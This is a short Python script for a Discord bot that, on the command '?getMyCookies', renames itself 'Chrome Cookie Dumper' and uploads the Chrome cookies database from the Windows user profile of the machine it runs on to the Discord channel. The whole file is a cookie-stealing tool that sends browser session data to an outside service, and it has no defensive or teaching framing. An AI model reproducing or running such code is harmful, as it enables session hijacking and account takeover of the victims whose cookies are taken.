import discord
import requests
import os
from os import path
from discord.ext import commands

chromecookies = os.path.expanduser('~') + "\\AppData\\Local\\Google\\User Data\\Default\\Cookies"

bot = commands.Bot(command_prefix='?')

@bot.command(name='getMyCookies')
async def getMyCookies(ctx):
    await bot.user.edit(username="Chrome Cookie Dumper")
    cookie = discord.File(chromecookies)
    await ctx.message.channel.send(file=cookie)


bot.run("__TOKEN")
